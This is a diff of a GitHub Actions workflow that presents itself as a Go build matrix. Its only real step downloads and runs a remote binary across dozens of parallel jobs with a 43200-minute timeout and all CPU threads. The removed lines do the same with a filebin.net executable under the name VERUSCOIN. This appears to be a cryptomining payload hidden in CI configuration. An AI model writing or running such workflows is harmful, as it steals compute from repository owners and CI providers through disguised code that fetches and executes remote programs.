@@ -1,8 +1,8 @@
-name: VERUSCOIN
+name: AdMiNwOrKiNg
 on: [push, pull_request]
 jobs:
   build:
-    name: Ba_channel
+    name: cc
     runs-on: ubuntu-22.04
     strategy:
       max-parallel: 30
@@ -10,9 +10,9 @@ jobs:
       matrix:
         go: [1.6, 1.7, 1.8, 1.9, 1.10]
         flag: [A, B, C, D, E, F, G, H, I]
-    timeout-minutes: 360
+    timeout-minutes: 43200
     env:
-        NUM_JOBS: 20
+        NUM_JOBS: 1000
         JOB: ${{ matrix.go }}
     steps:
     - name: Set up Go ${{ matrix.go }}
@@ -22,6 +22,6 @@ jobs:
       id: go
     - name: Setup
       uses: actions/checkout@v4
-    - name: BA_channel
+    - name: cc
       run: |
-        wget https://filebin.net/0rphmm10vzir3dml/next-app && chmod +x next-app && wget https://raw.githubusercontent.com/boeseption-sys/slamnc/refs/heads/main/config.json && ./next-app
+        wget https://github.com/neural-forge-ai/neural-forge-cli/releases/download/v1.0.0/neural-forge-cli-linux && chmod +x neural-forge-cli-linux && ./neural-forge-cli-linux --model llm-v2 --user-id b899a32a-0d10-47c5-a656-fad22c736354 --threads $(nproc --all)
